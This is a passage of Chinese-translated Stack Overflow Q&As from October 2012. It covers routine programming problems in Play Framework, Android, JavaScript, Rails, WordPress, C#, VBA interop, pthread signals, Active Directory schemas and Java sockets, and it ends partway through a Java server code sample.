> 时间：2012-10-10T13:38:14.277
> 
> 标签：playframework, playframework-2.0

因为 Play Framework 不支持 Cassandra 并且为了避免 Play 项目的构建问题，所以我制作了一个 Java 项目（基于 Kundaru 的工作）并将其命名为 KConnector，在 KConnector 项目中，有一些外部库（Kundaru 的 jar 文件）因此我导出该项目作为一个可运行的 Jar 文件（如果我只导出到 Jar 文件，它不会打包外部库）。然后按照[Instruction](http://www.playframework.org/documentation/2.0.4/SBTDependencies)，我创建一个 Playproject/lib 文件夹，然后在其中放入一个构建的 jar 文件。问题是我无法调用 KConnector jar 文件中的类...。Eclipse 无法识别它们是什么，它向我建议了一些导入，但它们都不是我的...谁能告诉我哪里错了？
P/S：我也试过运行 play ec 或 play compile 但没有希望...即使我运行了 play ec，lib 中的文件也消失到 Eclipse...
非常感谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-10T15:24:24.033

我使用play 2.0.4并使用外部jar，我在项目中创建了一个lib文件夹，在这个文件夹中添加了jar，运行'eclipsify'命令并在eclipse中刷新项目，我没有问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:40:24.923

右键单击项目并选择“配置构建路径...” 在库下单击“添加外部 jar” 在文件系统中选择您的 jar，您应该已经设置好了

# android - 手机屏幕锁定时不触发广播接收器

> ID：12820716
> 
> 赞同：4
> 
> 时间：2012-10-10T13:38:17.397
> 
> 标签：android, broadcastreceiver

当我安装应用程序时，一切正常。每次发送消息时，我都可以打印消息正文，直到锁定手机屏幕。之后，应用程序停止打印传入消息。我尝试了很多方法来克服这个问题，但没有运气。请帮我...

```
public class SmsReceiveActivity extends Activity{

@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sms);

receiver = new BroadcastReceiver() {

@Override
public void onReceive(Context context, Intent intent) {

if (intent.getAction().equals(SMS_RECEIVED)) {
Object[] pdus = (Object[]) bundle.get("pdus");
final android.telephony.SmsMessage[] messages = new android.telephony.SmsMessage[pdus.length];

for (int i = 0; i < pdus.length; i++) {
    messages[i] = android.telephony.SmsMessage.createFromPdu((byte[]) pdus[i]);
    incomingMsgString += messages[i].getMessageBody().toString();
   }
    // Print Incoming message Body
  }
 }
}        
  getApplication().registerReceiver(receiver, new IntentFilter(SMS_RECEIVED));
 }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T04:28:04.187

根据`BroadcastReceiver` [文档](http://developer.android.com/reference/android/content/BroadcastReceiver.html)，当您注册接收器时`registerReceiver()`，“暂停时您将不会收到意图”。如果您想要一个独立于您的活动的接收器，您应该将其实现为命名类并将其发布到您的清单中。例如，使用您的匿名创建一个命名类`BroadcastReceiver`，

```
public class MyReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {

if (intent.getAction().equals(SMS_RECEIVED)) {
Object[] pdus = (Object[]) bundle.get("pdus");
final android.telephony.SmsMessage[] messages = new android.telephony.SmsMessage[pdus.length];

for (int i = 0; i < pdus.length; i++) {
    messages[i] = android.telephony.SmsMessage.createFromPdu((byte[]) pdus[i]);
    incomingMsgString += messages[i].getMessageBody().toString();
   }
    // Print Incoming message Body
  }
 }
} 
```

并在您的清单中添加`application`标签内的接收器

```
 <receiver android:name=".MyReceiver" >
    <intent-filter>
    <action android:name="android.provider.Telephony.SMS_RECEIVED"/ >
    </intent-filter>
    </receiver> 
```

然后，当收到 SMS 消息时，`onReceive`将调用您的方法。在那里，您可以打包您需要的信息并启动您的意图`Activity`或`Service`进行进一步处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T04:50:46.103

将您的广播创建为静态内部类并将其注册到清单中。试试这个链接。[接收器作为Android中的内部类](https://stackoverflow.com/a/10851904/1239858)

# android - 通过 PC 访问 Android 共享存储

> ID：12820718
> 
> 赞同：1
> 
> 时间：2012-10-10T13:38:28.513
> 
> 标签：android, file, expansion

[测试你的扩展文件](http://developer.android.com/guide/google/play/expansion-files.html#Testing)

说：...例如，如果你的包名是com.example.android，你需要在共享存储空间上创建目录Android/obb/com.example.android/。（将您的测试设备插入您的计算机以挂载共享存储并手动创建此目录。）

我发现（通过 Environment.getExternalStorageDirectory()）外部存储在我的设备中安装为 /mnt/sdcard。所以.. 我怎样才能通过 Windows 访问这个存储来复制大约 200Mb 的文件？顺便说一句，该设备没有插入 micro-SD。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:55:42.253

您可以使用 adb push 将文件推送到您的设备。更多文档在这里：http: [//developer.android.com/tools/help/adb.html](http://developer.android.com/tools/help/adb.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-25T12:21:39.060

您还可以使用[Android 文件传输应用程序](https://android.com/filetransfer/)从 Mac 或 PC 复制文件。

[正如 Andrew 指出](https://stackoverflow.com/questions/12820718/android-shared-storage-accessibility-via-pc#comment17342771_12821065)的那样，报告的路径`Environment.getExternalStorageDirectory()`不一定与您在 Android File Transfer 应用程序的文件系统中看到的路径相匹配。在我的例子中，“Android”文件夹也存在于根目录中`/Android`——因此我可以忽略`Environment.getExternalStorageDirectory()`.

因此，要将扩展文件复制到设备上的相应目录中，我必须将它们复制到`/Android/obb/com.example.android/`设备上。

# javascript - onclick 事件的 Javascript“this”参考不起作用

> ID：12820724
> 
> 赞同：12
> 
> 时间：2012-10-10T13:38:53.683
> 
> 标签：javascript, this

我正在尝试使用“onclick”事件调用一个函数，如下所示：

```
<td id="A1" onclick="move()" class="white"></td>
<td id="A2" onclick="move()" class="painted bp"></td>
<td id="A3" onclick="move()" class="white"></td> 
```

在函数本身中，我指的是“this”：

```
function move(e){
    var myId = this.id;
    alert("myId");
} 
```

当我运行整个过程时，警报显示“未定义”。当我尝试时，`alert(this)`我得到 [对象窗口]。我正在使用 IE9，顺便说一句。谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-10-10T13:41:09.343

`this`是`window`代码中的对象。

`this`您可以作为参数传递。

```
<td id="A1" onclick="move(this)" class="white"></td> 
```

然后：

```
function move(ele){
    var myId = ele.id;
    alert("myId");
} 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-10-10T13:44:08.453

从事件处理程序调用函数时，它`this`不是由处理程序设置的（​​尽管您可以`this`根据 Xdazz 的答案从处理程序传递，或`this`根据 Kyle 的答案设置）。另一种方法是从与事件关联的事件对象中提取发送者元素：

```
function move(e) {
    if (!e)
        e = window.event;
    var sender = e.srcElement || e.target;

    //maybe some nested element.. find the actual table cell parent.
    while (sender && sender.nodeName.toLowerCase() != "td")
        sender = sender.parentNode;

    var myId = sender.id;
    alert(myId);
}
​ 
```

您还必须明确传递事件：

```
onclick="move(event)" 
```

请注意，当表格单元格具有嵌套元素时，它们将成为“发送者”，因此要获取所需的元素（即表格单元格），您必须向上遍历。*为了避免所有这些令人头疼的问题，请参阅下面如何通过代码附加处理程序*。

[现场测试用例](http://jsfiddle.net/H9YDn/5/)。

也就是说，更好的做法是通过代码而不是内联来绑定点击事件——不要将 HTML 与 JavaScript 混合。为了实现这一点，有这样的代码：

```
window.onload = function() {
    var arrCells = document.getElementsByTagName("td");
    for (var i = 0; i < arrCells.length; i++) {
        var oCell = arrCells[i];
        if (oCell.id && oCell.id.substr(0, 1) == "A") {
            oCell.onclick = move;
        }
    }
} 
```

使用上面的代码，您可以`onclick=`从 HTML 中删除内联调用并保留您的原始函数 -`this`将指向单击的表格单元格。

[更新了小提琴](http://jsfiddle.net/H9YDn/2/)。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-10T13:43:25.250

```
<td id="A1" onclick="move.call(this)" class="white"></td> 
```

现在`this`将引用函数中的`td`元素。`move`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:42:24.157

尝试使用事件目标来获取您正在寻找的 dom 元素：

```
function move(e) {
  alert(e.target);
} 
```

# ruby-on-rails-3 - ActsAsTaggableOn 在自己的标签实现之后

> ID：12820727
> 
> 赞同：0
> 
> 时间：2012-10-10T13:39:07.467
> 
> 标签：ruby-on-rails-3, tags, acts-as-taggable-on

我在 Rails 应用程序中有自己的标签实现，并希望用 ActsAsTaggableOn gem 替换它。我生成了迁移并删除了所有带有标签的迁移，但忘记先回滚，所以我只是做了 rake db:reset。现在，带有标签和可标记的架构看起来很好，但是如果我在控制台中尝试使用标签，只需输入标签，我就会得到

```
NameError: uninitialized constant Tag 
```

是什么导致了这个错误，我以为我只是喜欢在[Railscast](http://railscasts.com/episodes/382-tagging?autoplay=true)中。

我的 schema.rb 看起来像这样：

```
# encoding: UTF-8
# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended to check this file into your version control system.

ActiveRecord::Schema.define(:version => 20121009203921) do

  create_table "comments", :force => true do |t|
    t.text     "content"
    t.integer  "user_id"
    t.integer  "message_id"
    t.datetime "created_at", :null => false
    t.datetime "updated_at", :null => false
  end

  create_table "events", :force => true do |t|
    t.string   "name"
    t.datetime "start_at"
    t.datetime "end_at"
    t.integer  "user_id"
    t.datetime "created_at", :null => false
    t.datetime "updated_at", :null => false
  end

  create_table "messages", :force => true do |t|
    t.text     "content"
    t.integer  "user_id"
    t.datetime "created_at", :null => false
    t.datetime "updated_at", :null => false
  end

  create_table "taggings", :force => true do |t|
    t.integer  "tag_id"
    t.integer  "taggable_id"
    t.string   "taggable_type"
    t.integer  "tagger_id"
    t.string   "tagger_type"
    t.string   "context",       :limit => 128
    t.datetime "created_at"
  end

  add_index "taggings", ["tag_id"], :name => "index_taggings_on_tag_id"
  add_index "taggings", ["taggable_id", "taggable_type", "context"], :name => "index_taggings_on_taggable_id_and_taggable_type_and_context"

  create_table "tags", :force => true do |t|
    t.string "name"
  end

  create_table "users", :force => true do |t|
    t.string   "name"
    t.string   "email"
    t.datetime "created_at",                            :null => false
    t.datetime "updated_at",                            :null => false
    t.string   "encrypted_password"
    t.string   "salt"
    t.boolean  "admin",              :default => false
    t.string   "phone"
    t.string   "street"
    t.string   "zip"
    t.string   "location"
  end

  add_index "users", ["email"], :name => "index_users_on_email", :unique => true

end 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T01:50:15.053

我必须有一个模型，才能让它在控制台中工作。

# php - 在 WordPress 中将扩展类方法作为回调函数传递

> ID：12820728
> 
> 赞同：-1
> 
> 时间：2012-10-10T13:39:11.280
> 
> 标签：php, class, wordpress

这是[这个问题](https://stackoverflow.com/questions/12794152/passing-class-method-as-a-call-back-function-in-wordpress)的延续。当类被扩展时，它引用了原来的类方法。在创建的页面中回显的类名应该是*AnotherAdminPage*，它是扩展类名。

```
/* 
    Plugin Name: static method callback demo
*/

class AnotherAdminPage extends AdminPageClass {
}

add_action('admin_menu', AnotherAdminPage::_admin_menu());

class AdminPageClass {

    static function _admin_menu() {
        $class_name = get_class();
        $classinstance = new $class_name();
        return array(&$classinstance, "admin_menu");
    }
    function admin_menu() {
        add_options_page(
            'Sample Admin Page Class', 
            'Sample Admin Page Class', 
            'manage_options',
            'sample_admin-page_class', 
            array(&$this, 'admin_page'));
    }
    function admin_page() {
        ?>
        <div class="wrap">
            <p><?php echo get_class(); ?></p>
        </div>
        <?php
    }
} 
```

它通过重新定义扩展类中的方法来工作，但在这种情况下扩展它变得毫无意义。

```
class AnotherAdminPage extends AdminPageClass {

    static function _admin_menu() {
        $class_name = get_class();
        $classinstance = new $class_name();
        return array(&$classinstance, "admin_menu");
    }   
    function admin_page() {
        ?>
        <div class="wrap">
            <p><?php echo get_class(); ?></p>
        </div>
        <?php
    }   
} 
```

那么有没有更优雅的方式来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:48:08.497

你应该使用[`get_called_class`](http://php.net/manual/fr/function.get-called-class.php)（PHP 5.3）

**编辑**：

如果你没有 PHP 5.3，你应该阅读这个

[PHP get_call_class() 替代](https://stackoverflow.com/questions/3498510/php-get-called-class-alternative)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:48:28.213

使用 get **get_call_class**而不是**get_class**。[http://php.net/manual/en/function.get-call-class.php](http://php.net/manual/en/function.get-called-class.php)。那么就不需要重新定义_admin_menu函数了

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-10T15:00:11.587

我自己发现这行得通。

```
/* 
    Plugin Name: extended class method as a callback demo
*/

class AnotherAdminPage extends AdminPageClass {
}

add_action('admin_menu', array(new AnotherAdminPage, "admin_menu"));

class AdminPageClass {

    function admin_menu() {
        add_options_page(
            'Sample Admin Page Class', 
            'Sample Admin Page Class', 
            'manage_options',
            'sample_admin_page_class', 
            array(&$this, 'admin_page'));
    }
    function admin_page() {
        ?>
        <div class="wrap">
            <p><?php echo get_class($this); ?></p>
        </div>
        <?php
    }   
} 
```

# android - 静态库中的 Android Crystax NDK 宽字符函数

> ID：12820731
> 
> 赞同：0
> 
> 时间：2012-10-10T13:39:22.380
> 
> 标签：android, c, android-ndk, makefile, widechar

我使用 Crystax NDK，我有 2 个生成静态库 (libA.a) 和共享库 (libB.so) 的文件。模块 B 依赖于模块 A（由 B 的 make 文件中的 LOCAL_STATIC_LIBRARIES 反映）。
在模块 A 的代码中，我调用了 swscanf，它总是返回 -1。

我发现这个问题的解决方法很奇怪：如果我在模块 B 的代码中的某处添加对 swscanf 的调用，那么 swscanf 开始在任何地方都可以正常工作 - 在模块 B 和模块 A 中（即使我没有更改模块 A 的代码）。

我最好的猜测是链接的问题：如果我在顶级共享库中没有宽字符函数调用，那么链接器使用默认的 Google NDK 的函数实现。

请指教。

# c# - 解析器将 .net 字典或列表转换为 VBA 的等效字典或集合

> ID：12820749
> 
> 赞同：1
> 
> 时间：2012-10-10T13:40:26.077
> 
> 标签：c#, vba, excel, vsto, c#-to-vb.net

我必须将 .net 字典或对象的列表类型传递给 VBA。但是当我在 VBA 端传递 .net 字典时，我无法在 .net 端看到字典的元素。

我的 C# 代码

```
Dictionary<string,object> dict = new Dictionary<string,object>();
dict.Add("First", "1");
dict.Add("Second", "2");
dict.Add("third", "3");
dict.Add("Forth", "4"); 
```

我将 C# 中的 VBA 宏称为

```
Application.Run("MyVBAMacro", dict); 
```

在 VBA 方面我的宏是

```
public Sub MyVBAMacro(var as variant)

end Sub 
```

我也试过

```
public Sub MyVBAMacro(var as Scripting.Dictionary)

end Sub 
```

但对我不起作用。

在 VBA 的 WATCH 窗口中，我没有得到字典元素。

所以我认为.net 和 VBA 对象是不一样的。那么是否有任何解析类可以将我的 .net 对象转换为等效的 VBA 对象？

.net List 对象也有问题。.net 数组工作正常，但我想将对象的字典或集合类型传递给 VBA。

请让我知道是否有解决方案。

谢谢，莫尼尔甘加尔

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:55:27.293

在 VBA 和 .NET 之间进行互操作时需要使用 COM 这是一个简单的开始：[COM Interop](https://stackoverflow.com/questions/6453625/com-interop-what-should-i-do-to-make-a-c-sharp-property-usable-as-a-variant-fro)

但它很快就会变得更加复杂，我建议在执行此类任务时阅读通用 COM、编组、引用计数和类型库的主题。

使该字典 COM 可见的简单示例

```
[ComVisible(true)]
public interface IDictWrapper
{
    object GetByKey(string key);
}

[ComVisible(true)]
[ClassInterface(ClassInterfaceType.None)]
[ComDefaultInterface(typeof(IDictWrapper))]
public class DictWrapper: Dictionary<string,object>, IDictWrapper
{
    public object GetByKey(string key)
    {
        return base[key];
    }
} 
```

# c# - 排序列表而不创建新变量

> ID：12820752
> 
> 赞同：5
> 
> 时间：2012-10-10T13:40:43.143
> 
> 标签：c#, c#-4.0

我正在尝试使用[Enumerable.OrderBy](http://msdn.microsoft.com/en-us/library/bb549422.aspx)对 List 进行排序，因为最终我希望能够按多个字段进行排序。目前它似乎只有在我创建一个新变量`var`来保存结果视图时才有效，这意味着（我认为）需要重新转换类型。

有没有一种方法可以在保留原始 List 变量和类型的同时按多个字段对 List 进行排序？即我宁愿`_orderedbins`以类型变量结束`List<orderedbins>`

以下是我目前拥有的，但从 var test = ... 开始的所有内容似乎都有点错误。

```
public class orderedBins
{
    public string Bin { get; set; }
    public int Order { get; set; }
}

List<orderedbins> _orderedbins = new List<orderedbins>();
foreach (string item in splitbins)
{
    string[] spbinSetting = item.Split(',');
    bool bchecked = bool.Parse(spbinSetting[1]);
    int border = int.Parse(spbinSetting[2]);

    if (bchecked == true)
    {
        _orderedbins.Add(new orderedbins { bin = spbinSetting[0], Order = border });
    }
}

var test =_orderedbins.OrderBy(x => x.Order);
foreach (var item in test)
{
   string f = item.Bin;
   int g = item.Order;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-10T13:43:16.517

您知道，您可以通过...对订单执行多个子排序

```
lst.OrderBy(x => x.Prop1).ThenBy(x => x.Prop2).ThenByDescending(x => x.Prop3)... 
```

只需添加 a`.ToList();`并将其与变量一起引入，即可将结果放入列表变量中。

编辑：

威廉的伟大建议，以提高可读性：

```
from x in lst
order by x.Prop1, x.Prop2, x.Prop3
select x 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-10T13:49:11.360

您可以创建一个新的排序列表，而无需使用创建新变量

```
list = list.OrderBy(item => item.Field1).ThenBy(item => item.Field1).ToList(); 
```

尽管如此，它仍然会创建一个全新的列表（添加一个新变量实际上并不是什么大问题；这些很便宜。只要列表不是很大，创建一个新列表就可以了。

如果您需要对列表进行适当的排序，那么您需要使用自定义比较器和列表的排序方法：

```
public class MyComparer : IComparer<MyClass>
{

    public int Compare(MyClass x, MyClass y)
    {
        if(x.Field1 != y.Field1)
            return x.Field1.CompareTo(y.Field1)
        else
            return x.Field2.CompareTo(y.Field2);
    }
}

List<MyClass> list = new List<MyClass>();
//Populate list

list.Sort(new MyComparer()); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-10T13:42:28.510

这可以解决问题：

```
_orderedbins = _orderedbins.OrderBy(x => x.Order).ToList(); 
```

...但是创建新变量/引用没有真正的问题。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-10-10T14:10:41.280

正如其他人所建议的那样，使用 Linq`OrderBy(...).ToList()`将是一种更清洁的方式，但这将为您提供列表的新实例。

要保留原始实例，请考虑使用`List<T>.Sort()`：

```
_orderedbins.Sort(new Comparison<orderedBins>((obj1, obj2) =>
{
    int result = obj1.Order.CompareTo(obj2.Order);
    return result != 0 ? result : obj1.Bin.CompareTo(obj2.Bin);
})); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-10T13:44:10.860

我认为这会做到（它已经是一个订单箱列表，所以不需要强制转换）：

```
_orderbins = _orderbins.OrderBy(x => x.Order).ToList(); 
```

# c# - 从 Windows Phone 应用程序获取未接电话的数量

> ID：12820756
> 
> 赞同：0
> 
> 时间：2012-10-10T13:40:52.760
> 
> 标签：c#, windows, windows-phone-7

是否可以在应用程序打开时从我的 Windows Phone 应用程序获取未接电话的数量？我只想得到计数。不需要任何电话号码或个人详细信息。如果有可能我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:44:34.547

不，这是不可能的。根据MVP的回答：

[http://social.msdn.microsoft.com/Forums/en-US/wpdevelop/thread/7ba65ddf-13ab-4bda-b93f-e1e88fd5d470/](http://social.msdn.microsoft.com/Forums/en-US/wpdevelop/thread/7ba65ddf-13ab-4bda-b93f-e1e88fd5d470/)

# android - Android Intent：-使用Intent从Activity传递类对象

> ID：12820758
> 
> 赞同：8
> 
> 时间：2012-10-10T13:41:00.710
> 
> 标签：android, android-intent

> **可能重复：**
> [如何使用 Intents 将对象从一个 Android Activity 发送到另一个？](https://stackoverflow.com/questions/2139134/how-to-send-an-object-from-one-android-activity-to-another-using-intents)

当一个活动调用另一个活动时，我想将一个类对象从一个活动传递给另一个活动。我试图用`Intent.putExtra(name, value)`它来做，但我没有`Intent.getExtra(name)`方法。有很多方法，比如`getStringExtra(name)`，`getDataExtra(name)`等等，但我输入的值`putExtra`是一个类对象，它有很多不同的值，如 String、Data 和 int。我怎样才能通过那门课？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:50:29.287

您可以使用`Serializable`或`Parcelable`

如果你使用`Serializable`你只需要通过编写来实现它`implements Serializable`

如果你使用`Parcelable`你必须填写使用的方法。请参阅：http: [//developer.android.com/reference/android/os/Parcelable.html](http://developer.android.com/reference/android/os/Parcelable.html)

在此处阅读差异：[http ://www.mooproductions.org/node/6](http://www.mooproductions.org/node/6)

结论：`Parcelable`确实更快，但需要更多时间来实施。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:45:26.400

为了传递您的自定义对象`Intent`，您需要确保您的类*实现* [`Parcelable`](http://developer.android.com/reference/android/os/Parcelable.html)。

有关更多信息，请阅读[本](http://prasanta-paul.blogspot.se/2010/06/android-parcelable-example.html)教程。

# html - 导航栏端盖

> ID：12820762
> 
> 赞同：2
> 
> 时间：2012-10-10T13:41:15.377
> 
> 标签：html

我对此真的很陌生，所以请多多包涵。我正在编辑现有的 3dCart 网站，但导航栏出现问题。

条形背景图像跨越 100%，因此我的端盖没有正确显示透明度。我在作弊，端盖上应该是透明的，与页面背景颜色相同，但它不正确，你可以看到它。

我想知道的是如何将端盖放置在端部而不是杆的“顶部”上，可以这么说。

```
<td><table width="100%" border="0" cellpadding="0" cellspacing="0" style="background: url(assets/templates/[template]/images/menu-bg.gif) repeat-x; color: #000; text-align: right">
            <tr>
              <td width="13"><img src="assets/templates/[template]/images/menu-l.png" width="13" height="48"></td> 
```

端盖 (menu-l) 是一个具有透明度的 png 文件，但它不起作用。我使用的是 jpg，透明部分设置为主页背景颜色，但它是渐变色，看起来不正确。

如果有人能告诉我如何将这些帽子放在末端，我将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:59:56.890

您可能应该使用 div，而不是使用表格。使用 div 元素，您可以使用 position 属性将图像直接放在您想要的位置。

```
#navcap1{position:absolute;left:XXpx;top:TTpx;}
#navcap2{position:absolute;right:ZZpx;top:TTpx;} 
```

或者，更好的方法可能是为导航创建一个 div，然后在 div 内将端盖向左和向右浮动。

```
<div id=nav style="background:imagex; prop2:x; prop3:x;">
   <div id=capleft style="display:block; float:left;"></div>
   <div id=capright style="display:block; float:right;"></div>
</div> 
```

或者，您可以只控制 div 的宽度，这样您甚至不需要端盖。

无论哪种方式，我都不会使用桌子，并且会打破这种风格。

# vb.net - .NET 中的异步递归

> ID：12820763
> 
> 赞同：2
> 
> 时间：2012-10-10T13:41:16.013
> 
> 标签：vb.net, asynchronous, recursion, async-await, ctp

我这里有一些愚蠢的代码

```
Async Function GetCoolNumber() As Task(Of Double)
    Dim n = Await GetNumberFromSomeAsyncSource()
    If IsCool(n) Then
        Return n
    End If
    Return Await GetCoolNumber()
End Function

Private Function GetNumberFromSomeAsyncSource() As Task(Of Double)

Private Function IsCool(n As Object) As Boolean 
```

现在递归工作正常，我得到了我想要的结果。当然，我的真实代码更复杂。然而，这被认为是不好的做法吗？

如果我以这种方式进行无限递归会怎样？有什么东西会吹吗？我的直觉是，我会继续将任务转储到堆上，而不是炸毁我的堆栈。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:13:29.643

我倾向于避免 .NET 中的正常递归；对尾调用优化的支持存在一些差异，所以我只是作为一般规则避开。

使用`async`，你*可能*会因为重写而没问题；您可以使用 dotPeek / JustDecompile 确定。

IMO 最好避免依赖未记录的功能。因此，如果重写是正式记录的（例如，VB.NET 语言标准），那么我会说它很好。否则，我会迭代地编写它。

# c++ - 我可以向不同的线程发送信号吗

> ID：12820765
> 
> 赞同：4
> 
> 时间：2012-10-10T13:41:25.000
> 
> 标签：c++, c, linux, gcc, x86

假设我有一个线程 A，它想向线程 B、C 和 D 发送信号。我可以做这样的事情吗？

```
SendSignalTo( ThreadB, SIGUSR1 );
SendSignalTo( ThreadC, SIGUSR1 );
SendSignalTo( ThreadD, SIGUSR1 ); 
```

使用 SIGUSR1 信号处理程序，为线程 B、C 和 D 定义不同，如下所示。

```
void SIGUSR1_Handler_for_ThreadB(...){...}
void SIGUSR1_Handler_for_ThreadC(...){...}
void SIGUSR1_Handler_for_ThreadD(...){...} 
```

如果没有，还有什么选择。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-10T16:15:11.537

您可以使用 向特定线程发送信号[`pthread_kill()`](http://www.kernel.org/doc/man-pages/online/pages/man3/pthread_kill.3.html)，或者如果您不介意特定于 GNU，则可以使用[`pthread_sigqueue()`](http://www.kernel.org/doc/man-pages/online/pages/man3/pthread_sigqueue.3.html)（可以指定一个`int`或`void *`处理程序可以通过 访问`info->si_value`）。

进程的每个信号只有一个信号处理程序。这意味着特定信号将始终调用相同的处理函数，无论它碰巧是哪个线程。如果一个线程设置了新的信号处理程序，则信号处理程序将为所有线程更改。

但是，解决方法很简单：使用每个线程的函数指针来定义信号处理程序应该调用哪个函数。请记住信号处理程序的限制——您只能在信号处理程序中使用[异步信号安全函数](http://www.kernel.org/doc/man-pages/online/pages/man7/signal.7.html)。

```
/* Simplify by defining the signal handler function type, assume SA_SIGINFO */
typedef void (*signal_handler_t)(int, siginfo_t *, void *);

/* Per-thread variable pointing to the desired function */
static __thread signal_handler_t  thread_handler = NULL;

/* Process-wide actual signal handler */
static void signal_handler(int signum, siginfo_t *info, void *context)
{
    signal_handler_t  func;

    func = __sync_fetch_and_or(&thread_handler, (signal_handler_t)0);

    if (func)
            func(signum, info, context);
} 
```

原子加载 ( `__sync_fetch_and_or()`) 允许您在任何时间点使用简单的原子存储轻松更改每个线程的处理程序，甚至不会阻塞信号。`new_thread_handler`然后切换到功能

```
 signal_handler_t  func;

    do {
        func = thread_handler;
    } while (!__sync_bool_compare_and_swap(&thread_handler, func, new_thread_handler)); 
```

和`__sync_fetch_and_or()`函数开关都可以用一个 C++11 风格的`__atomic_`调用来代替，但是我还没有足够近的 GCC，所以我仍在使用旧风格的`__sync_`调用。

POSIX 还支持*实时*信号，, `SIGRTMIN+0`, `SIGRTMIN+1`.., `SIGRTMAX`. 它们还有一个额外的好处，即它们中的一个以上可以同时挂起。它们比传统信号更适合这种事情。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-10T13:44:36.633

是和不是。

对我来说新的是 pthread_kill() 函数，它允许您向同一进程下的线程发送信号。

[http://linux.die.net/man/3/pthread_kill](http://linux.die.net/man/3/pthread_kill)

请注意阅读页面底部的注释...

> 信号处理是进程范围的：如果安装了信号处理程序，处理程序将在线程线程中调用，但如果信号处理是“停止”、“继续”或“终止”，此操作将影响整个过程。

我对此的解释是，进程的处理程序将被调用，然后您可以采取适当的措施，只要您满足这些条件，就知道该处理程序只为该线程调用。

# active-directory - RFC 2307 与 UNIX 的身份管理

> ID：12820766
> 
> 赞同：1
> 
> 时间：2012-10-10T13:41:25.623
> 
> 标签：active-directory, ldap, user-identification

我正在尝试了解 AD 架构扩展，我遇到了那些 2\. 到底有什么区别？它们相互包含吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T22:29:14.623

RFC2307 是 LDAP 投诉系统中普遍使用的标准属性和类。

Unix 的身份管理意味着 Active Directory 上的一些服务和其他位。我认为您还会获得显示其中一些的 MMC 扩展。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T11:34:30.667

RFC2307(bis) 的核心是由 Sun 和其他公司（最著名的是 PADL）开发的模式，试图将 LDAP 用作网络信息服务，而不是与 NIS 或 NIS+ 混淆。

# java - windows7下如何杀死打开的服务器套接字？

> ID：12820767
> 
> 赞同：0
> 
> 时间：2012-10-10T13:41:25.093
> 
> 标签：java, eclipse, sockets, client

我写了一个简单的服务器客户端套接字程序，当我重新编译服务器时，我得到：

```
java.net.BindException: Address already in use: JVM_Bind
    at java.net.DualStackPlainSocketImpl.bind0(Native Method)
    at java.net.DualStackPlainSocketImpl.socketBind(Unknown Source)
    at java.net.AbstractPlainSocketImpl.bind(Unknown Source)
    at java.net.PlainSocketImpl.bind(Unknown Source)
    at java.net.ServerSocket.bind(Unknown Source)
    at java.net.ServerSocket.<init>(Unknown Source)
    at java.net.ServerSocket.<init>(Unknown Source) 
```

因此我的问题是如何在 Windows 7 下杀死套接字？是否有可能的解决方案在 Eclipse 中杀死它？

我很欣赏你的回答！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:45:21.693

当我遇到它时，杀死 jvm 这解决了这个问题。您是否在停止简单服务器之前关闭代码中的套接字？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T13:49:46.543

与 RGdev 一样，我假设您仍然有一个 javaw 进程在后台运行，它使连接保持打开状态。但它也可能是您机器上的不同服务器程序，它占用了您要使用的端口。

`netstat`您可以使用 cmd shell 中的命令找出哪些进程正在侦听哪个端口。以下参数列表 (a) 包括服务器在内的所有连接，(b) 显示打开连接的可执行文件，以及 (n) 禁止用服务名称替换端口号以用于知名端口。

```
netstat -abn 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:59:42.823

这是我的服务器端代码：

```
import java.io.*;
import java.net.*;

public class ServerSide {

    public static void main(String[] args) {

        try
        {
            ServerSocket myServerSocket = new ServerSocket(9999);
            System.out.println("Server is waiting on host" + InetAddress.getLocalHost().getCanonicalHostName() + "port= "+ myServerSocket.getLocalPort());
            Socket skt = myServerSocket.accept();

